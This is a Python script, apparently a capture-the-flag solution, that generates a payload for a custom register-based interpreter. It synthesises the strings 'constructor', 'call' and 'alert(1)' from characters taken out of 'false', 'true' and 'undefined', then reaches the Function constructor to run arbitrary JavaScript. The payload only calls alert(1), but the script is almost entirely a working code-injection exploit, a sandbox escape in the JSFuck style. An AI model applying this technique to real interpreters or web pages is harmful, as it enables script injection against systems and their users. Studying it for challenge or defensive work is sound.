#!/usr/bin/env python3
​
FALSE_LIT_REG = 'A'
TRUE_LIT_REG = 'B'
​
EMPTY_STR_REG = 'C'
EMPTY_LIST_REG = 'd'  # we start with this one
​
FALSE_STR_REG = 'D'
TRUE_STR_REG = 'E'
UNDEFINED_STR_REG = 'Z'
​
LIT_0_REG = 'F'
LIT_1_REG = 'G'
LIT_2_REG = 'H'
LIT_3_REG = 'I'
LIT_4_REG = 'J'
LIT_5_REG = 'K'
LIT_6_REG = 'L'
LIT_7_REG = 'M'
LIT_13_REG = 'e'
LIT_14_REG = 'f'
​
STR_1_REG = 'g'
​
LOAD_CHAR_REG = 'N'
​
FILL_STR_REG = 'O'
FILL_FUNC_REG = 'Y'
FILL_FUNC_STR_REG = 'X'
CALL_STR_REG = 'Q'
CONSTRUCTOR_STR_REG = 'P'
ALERT_STR_REG = 'R'
​
CONSTRUCTOR_FUNC_REG = 'S'
CALL_FUNC_REG = 'T'
​
LOAD_FUNC_REG = 'h'
​
​
def init_primitives():
    return (
        f'{FALSE_LIT_REG}cdd'  # ![] --> false
        f'{TRUE_LIT_REG}c{FALSE_LIT_REG}d'  # !false --> true
        f'{EMPTY_STR_REG}b{EMPTY_LIST_REG}{EMPTY_LIST_REG}'  # [] + [] --> ''
        f'{FALSE_STR_REG}b{FALSE_LIT_REG}{EMPTY_STR_REG}'  # false + '' --> 'false'
        f'{TRUE_STR_REG}b{TRUE_LIT_REG}{EMPTY_STR_REG}'  # true + '' --> 'true'
        f'{UNDEFINED_STR_REG}bx{EMPTY_STR_REG}'  # undefined + '' --> 'undefined'
    )
​
​
def init_indices():
    return (
        f'{LIT_0_REG}b{FALSE_LIT_REG}{FALSE_LIT_REG}'  # false + false --> 0
        f'{LIT_1_REG}b{FALSE_LIT_REG}{TRUE_LIT_REG}'  # false + true --> 1
        f'{LIT_2_REG}b{LIT_1_REG}{LIT_1_REG}'
        f'{LIT_3_REG}b{LIT_2_REG}{LIT_1_REG}'
        f'{LIT_4_REG}b{LIT_3_REG}{LIT_1_REG}'
        f'{LIT_5_REG}b{LIT_4_REG}{LIT_1_REG}'
        f'{LIT_6_REG}b{LIT_5_REG}{LIT_1_REG}'
        f'{LIT_7_REG}b{LIT_6_REG}{LIT_1_REG}'
        f'{LIT_13_REG}b{LIT_7_REG}{LIT_6_REG}'
        f'{LIT_14_REG}b{LIT_7_REG}{LIT_7_REG}'
        f'{STR_1_REG}b{LIT_1_REG}{EMPTY_STR_REG}'
    )
​
​
def load_char(lit_reg, idx_reg):
    return f'{LOAD_CHAR_REG}a{lit_reg}{idx_reg}'
​
​
def init_fill_str():
    return (
        f'{FILL_STR_REG}b{EMPTY_STR_REG}{EMPTY_STR_REG}'
        f'{load_char(FALSE_STR_REG, LIT_0_REG)}'
        f'{FILL_STR_REG}b{FILL_STR_REG}{LOAD_CHAR_REG}'
        f'{load_char(UNDEFINED_STR_REG, LIT_5_REG)}'
        f'{FILL_STR_REG}b{FILL_STR_REG}{LOAD_CHAR_REG}'
        f'{load_char(FALSE_STR_REG, LIT_2_REG)}'
        f'{FILL_STR_REG}b{FILL_STR_REG}{LOAD_CHAR_REG}'
        f'{FILL_STR_REG}b{FILL_STR_REG}{LOAD_CHAR_REG}'
    )
​
​
def build_constructor_str():
    return (
        f'{CONSTRUCTOR_STR_REG}b{EMPTY_STR_REG}{EMPTY_STR_REG}'
        f'{load_char(FILL_FUNC_STR_REG, LIT_3_REG)}'
        f'{CONSTRUCTOR_STR_REG}b{CONSTRUCTOR_STR_REG}{LOAD_CHAR_REG}'
        f'{load_char(FILL_FUNC_STR_REG, LIT_6_REG)}'
        f'{CONSTRUCTOR_STR_REG}b{CONSTRUCTOR_STR_REG}{LOAD_CHAR_REG}'
        f'{load_char(FILL_FUNC_STR_REG, LIT_2_REG)}'
        f'{CONSTRUCTOR_STR_REG}b{CONSTRUCTOR_STR_REG}{LOAD_CHAR_REG}'
        f'{load_char(FALSE_STR_REG, LIT_3_REG)}'
        f'{CONSTRUCTOR_STR_REG}b{CONSTRUCTOR_STR_REG}{LOAD_CHAR_REG}'
        f'{load_char(TRUE_STR_REG, LIT_0_REG)}'
        f'{CONSTRUCTOR_STR_REG}b{CONSTRUCTOR_STR_REG}{LOAD_CHAR_REG}'
        f'{load_char(TRUE_STR_REG, LIT_1_REG)}'
        f'{CONSTRUCTOR_STR_REG}b{CONSTRUCTOR_STR_REG}{LOAD_CHAR_REG}'
        f'{load_char(TRUE_STR_REG, LIT_2_REG)}'
        f'{CONSTRUCTOR_STR_REG}b{CONSTRUCTOR_STR_REG}{LOAD_CHAR_REG}'
        f'{load_char(FILL_FUNC_STR_REG, LIT_3_REG)}'
        f'{CONSTRUCTOR_STR_REG}b{CONSTRUCTOR_STR_REG}{LOAD_CHAR_REG}'
        f'{load_char(TRUE_STR_REG, LIT_0_REG)}'
        f'{CONSTRUCTOR_STR_REG}b{CONSTRUCTOR_STR_REG}{LOAD_CHAR_REG}'
        f'{load_char(FILL_FUNC_STR_REG, LIT_6_REG)}'
        f'{CONSTRUCTOR_STR_REG}b{CONSTRUCTOR_STR_REG}{LOAD_CHAR_REG}'
        f'{load_char(TRUE_STR_REG, LIT_1_REG)}'
        f'{CONSTRUCTOR_STR_REG}b{CONSTRUCTOR_STR_REG}{LOAD_CHAR_REG}'
    )
​
​
def build_call_str():
    return (
        f'{CALL_STR_REG}b{EMPTY_STR_REG}{EMPTY_STR_REG}'
        f'{load_char(CONSTRUCTOR_STR_REG, LIT_0_REG)}'
        f'{CALL_STR_REG}b{CALL_STR_REG}{LOAD_CHAR_REG}'
        f'{load_char(FALSE_STR_REG, LIT_1_REG)}'
        f'{CALL_STR_REG}b{CALL_STR_REG}{LOAD_CHAR_REG}'
        f'{load_char(FALSE_STR_REG, LIT_2_REG)}'
        f'{CALL_STR_REG}b{CALL_STR_REG}{LOAD_CHAR_REG}'
        f'{CALL_STR_REG}b{CALL_STR_REG}{LOAD_CHAR_REG}'
    )
​
​
def build_alert_str():
    return (
        f'{ALERT_STR_REG}b{EMPTY_STR_REG}{EMPTY_STR_REG}'
​
        f'{load_char(FALSE_STR_REG, LIT_1_REG)}'
        f'{ALERT_STR_REG}b{ALERT_STR_REG}{LOAD_CHAR_REG}'
        f'{load_char(FALSE_STR_REG, LIT_2_REG)}'
        f'{ALERT_STR_REG}b{ALERT_STR_REG}{LOAD_CHAR_REG}'
        f'{load_char(TRUE_STR_REG, LIT_3_REG)}'
        f'{ALERT_STR_REG}b{ALERT_STR_REG}{LOAD_CHAR_REG}'
        f'{load_char(TRUE_STR_REG, LIT_1_REG)}'
        f'{ALERT_STR_REG}b{ALERT_STR_REG}{LOAD_CHAR_REG}'
        f'{load_char(TRUE_STR_REG, LIT_0_REG)}'
        f'{ALERT_STR_REG}b{ALERT_STR_REG}{LOAD_CHAR_REG}'
        f'{load_char(FILL_FUNC_STR_REG, LIT_13_REG)}'
        f'{ALERT_STR_REG}b{ALERT_STR_REG}{LOAD_CHAR_REG}'
        f'{ALERT_STR_REG}b{ALERT_STR_REG}{STR_1_REG}'
        f'{load_char(FILL_FUNC_STR_REG, LIT_14_REG)}'
        f'{ALERT_STR_REG}b{ALERT_STR_REG}{LOAD_CHAR_REG}'
    )
​
​
def main():
    if False:
        required_chars = set('a') | set('constructor') | set('call') | set('alert(1)')
        required_chars -= set('true') | set('false') | set('undefined')
        print('Require the following characters for payload generation:')
        print(''.join(sorted(required_chars)))
​
    sol = ''
    sol += 'x' * 5
​
    sol += init_primitives()
    sol += init_indices()
​
    sol += init_fill_str()
    sol += f'{FILL_FUNC_REG}a{EMPTY_LIST_REG}{FILL_STR_REG}'
    sol += f'{FILL_FUNC_STR_REG}b{FILL_FUNC_REG}{EMPTY_STR_REG}'
​
    sol += build_constructor_str()
    sol += build_call_str()
    sol += build_alert_str()
​
    sol += f'{LOAD_FUNC_REG}a{FILL_FUNC_REG}{CONSTRUCTOR_STR_REG}'
    sol += f'{LOAD_FUNC_REG}{LOAD_FUNC_REG}{EMPTY_STR_REG}{ALERT_STR_REG}'
    sol += f'{LOAD_FUNC_REG}{LOAD_FUNC_REG}{EMPTY_STR_REG}{EMPTY_STR_REG}'
​
    return sol
​
​
if __name__ == '__main__':
    print(main())
